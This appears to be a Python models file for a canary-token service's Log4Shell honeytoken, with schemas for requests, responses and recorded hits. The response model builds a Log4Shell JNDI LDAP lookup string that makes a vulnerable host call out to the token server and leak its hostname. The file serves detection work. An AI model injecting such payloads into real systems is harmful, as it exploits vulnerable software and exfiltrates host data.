from typing import Any, List, Literal, Optional

from pydantic import root_validator
from .common import (
    TokenHistory,
    TokenHit,
    TokenRequest,
    TokenResponse,
    TokenTypes,
)


class Log4ShellTokenRequest(TokenRequest):
    token_type: Literal[TokenTypes.LOG4SHELL] = TokenTypes.LOG4SHELL

    class Config:
        schema_extra = {
            "example": {
                "token_type": TokenTypes.LOG4SHELL,
                "memo": "Reminder note when this token is triggered",
                "email": "username@domain.com",
                "webhook_url": "https://slack.com/api/api.test",
            },
        }


class Log4ShellTokenResponse(TokenResponse):
    # DESIGN: These 2 markers should be application constants.
    #         keeping here until they are needed elsewhere.
    _hostname_marker: Literal["x"] = "x"
    _token_marker: Literal["L4J"] = "L4J"
    token_type: Literal[TokenTypes.LOG4SHELL] = TokenTypes.LOG4SHELL
    token_usage: str
    token_with_usage_info: str
    # src_data: dict[str, str]

    @root_validator(pre=True)
    def set_token_usage_info(cls, values: dict[str, Any]) -> dict[str, Any]:  # type: ignore
        values["token_with_usage_info"] = (
            f"{cls._hostname_marker}{{hostname}}.{cls._token_marker}.{values['hostname']}"
        )
        return values

    @root_validator(pre=True)
    def set_token_usage(cls, values: dict[str, Any]) -> dict[str, Any]:  # type: ignore
        values["token_usage"] = (
            f"${{jndi:ldap://{cls._hostname_marker}${{hostName}}.{cls._token_marker}.{values['hostname']}/a}}"
        )
        return values

    class Config:
        schema_extra = {
            "example": {
                "token_type": TokenTypes.LOG4SHELL,
                "memo": "Added to user login portal.",
                "email": "username@domain.com",
                "webhook_url": "https://slack.com/api/api.test",
            },
        }


class Log4ShellTokenHit(TokenHit):
    token_type: Literal[TokenTypes.LOG4SHELL] = TokenTypes.LOG4SHELL
    src_data: Optional[dict]


class Log4ShellTokenHistory(TokenHistory[Log4ShellTokenHit]):
    token_type: Literal[TokenTypes.LOG4SHELL] = TokenTypes.LOG4SHELL
    hits: List[Log4ShellTokenHit] = []
